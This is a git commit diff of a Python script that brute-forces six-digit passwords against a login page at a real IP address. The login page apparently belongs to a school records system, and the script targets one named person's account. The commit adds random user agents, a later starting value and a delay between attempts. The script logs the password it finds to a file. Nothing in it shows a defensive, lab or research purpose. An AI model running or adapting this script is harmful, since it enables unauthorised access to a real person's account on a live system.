305877b3250623a43362217ccb6d7bb388c9a730
yoni13 <76271912+yoni13@users.noreply.github.com>
2022-10-11 17:56:37 +0800

    Add files via upload

--- main.py
+++ main.py
@@ -1,39 +1,29 @@
 import requests,os,random,time
+from fake_useragent import UserAgent
+ua = UserAgent()
 from faker import Faker  
 faker = Faker()
-passwd = 0
+passwd = 200000
+
 while True:
-    header = {
-	'User-Agent':'Mozilla/5.0 (Linux; Android 12; SM-P613) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
-	'Upgrade-Insecure-Requests':'1',
-	'Referer':'http://140.126.151.12/csnskj/Permain.asp',
-	'Origin':'http://140.126.151.12',
-	'Host':'140.126.151.12',
-	'Content-Type':'application/x-www-form-urlencoded',
-	'Content-Length':'169',
-	'Connection':'keep-alive',
-	'Cache-Control':'max-age=0',
-	'Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
-	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-	'Accept-Encoding': 'gzip, deflate'
-    }
-    if len(str(passwd)) == 1:
-    	spasswd = '00000' + str(passwd)
-    if len(str(passwd)) == 2:
-    	spasswd = '0000' + str(passwd)
-    if len(str(passwd)) == 3:
-    	spasswd = '000' + str(passwd)
-    if len(str(passwd)) == 4:
-    	spasswd = '00' + str(passwd)
-    if len(str(passwd)) == 5:
-    	spasswd = '0' + str(passwd)
-    if len(str(passwd)) == 6:
-    	spasswd = str(passwd)
-    if passwd > 1000000:
-    	print('fuck failed')
-    	break
+	header = {'User-Agent':ua.chrome,'Upgrade-Insecure-Requests':'1','Referer':'http://140.126.151.12/csnskj/Permain.asp','Origin':'http://140.126.151.12','Host':'140.126.151.12','Content-Type':'application/x-www-form-urlencoded','Content-Length':'169','Connection':'keep-alive','Cache-Control':'max-age=0','Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate'}
+	if len(str(passwd)) == 1:
+		spasswd = '00000' + str(passwd)
+	if len(str(passwd)) == 2:
+		spasswd = '0000' + str(passwd)
+	if len(str(passwd)) == 3:
+		spasswd = '000' + str(passwd)
+	if len(str(passwd)) == 4:
+		spasswd = '00' + str(passwd)
+	if len(str(passwd)) == 5:
+		spasswd = '0' + str(passwd)
+	if len(str(passwd)) == 6:
+		spasswd = str(passwd)
+	if passwd > 1000000:
+		print('fuck failed')
+		break
     
-    r = requests.post('http://140.126.151.12/csnskj/Reg_Per.ASP',data={
+	r = requests.post('http://140.126.151.12/csnskj/Reg_Per.ASP',data={
     'SCH_NO':'',
     'Time':'',
     'LEVEL':'0',
@@ -42,19 +32,20 @@ while True:
     'txtName':'吳俊翰'.encode('big5'),
     'txtPass':spasswd
     },headers=header,allow_redirects=False)
-    r.encoding = 'big5'
-    rheader = r.headers['Set-Cookie']
-    if 'mPass' in rheader:
+	r.encoding = 'big5'
+	rheader = r.headers['Set-Cookie']
+	if 'mPass' in rheader:
     	#we fuck out the real passwd
-    	file = open('passwd.txt','a+')
-    	file.write(str(spasswd)+'\n')
-    	file.close()
-    	print('passwd is ' +passwd)
-    	break
-    else:
+		file = open('passwd.txt','a+')
+		file.write(str(spasswd)+'\n')
+		file.close()
+		print('passwd is ' +passwd)
+		break
+	else:
     	#not yet
-    	file = open('failed.txt','a+')
-    	file.write(str(spasswd)+'\n')
-    	file.close()
-    	passwd += 1
-    	print(spasswd)
+		file = open('failed.txt','a+')
+		file.write(str(spasswd)+'\n')
+		file.close()
+		passwd += 1
+		print("\r Running...."+spasswd,end = "")
+		time.sleep(0.5)
